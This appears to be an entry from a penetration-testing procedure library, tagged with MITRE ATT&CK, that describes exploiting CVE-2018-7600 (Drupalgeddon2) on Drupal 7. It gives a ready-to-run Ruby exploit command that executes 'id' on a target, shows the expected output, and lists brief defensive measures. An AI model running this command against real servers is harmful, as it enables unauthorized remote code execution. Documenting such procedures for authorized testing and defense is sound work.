---
id: proc-002
tags:
  - rce
  - command-execution
  - drupal
type: procedure
tools:
  - '[[tools/ruby]]'
  - '[[tools/drupalgeddon2-customizable-beta-rb]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/ruby-drupalgeddon2-id]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:23:36.696Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
---
# Execute-RCE-with-ID-Command

## Summary

This procedure exploits CVE-2018-7600 to execute the 'id' command on a vulnerable Drupal 7 server, confirming RCE and revealing the web server user context.

## Description

The attack targets the form submission mechanism in Drupal, injecting PHP code via POST requests to /user/password and /file/ajax/name endpoints. It exploits the form_build_id to run arbitrary commands as the apache user. This is used after confirming Drupal 7.54 via site inspection. Expected outcome: Command output from the remote server.

## Requirements

1. Downloaded Drupalgeddon2 script
2. Target URL with vulnerable Drupal 7
3. Ruby interpreter

## Defense

Defensive measures and detection strategies:

- Update Drupal to latest version (patch SA-CORE-2018-002)
- Monitor for anomalous POST requests to form endpoints
- Implement WAF rules for PHP injection patterns

## Objectives

1. Confirm RCE capability
2. Identify server user privileges
3. Validate exploit success

## Instructions

### Step 1: Run the Exploit Script

**Context**: Target the user/login form to inject and execute the 'id' command.

**Command** ([[commands/ruby-drupalgeddon2-id]]):
```bash
ruby drupalgeddon2-customizable-beta.rb -u https://www.████████/ -v 7 -c id --form user/login
```

> The script sends crafted requests, extracts form ID, and executes the command. Expected output: 'uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0'.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### Sub-Techniques


## Commands Used

- [[commands/ruby-drupalgeddon2-id]]

## Tools Used

- [[tools/ruby]]
- [[tools/drupalgeddon2-customizable-beta-rb]]

## Tags

- rce
- execution
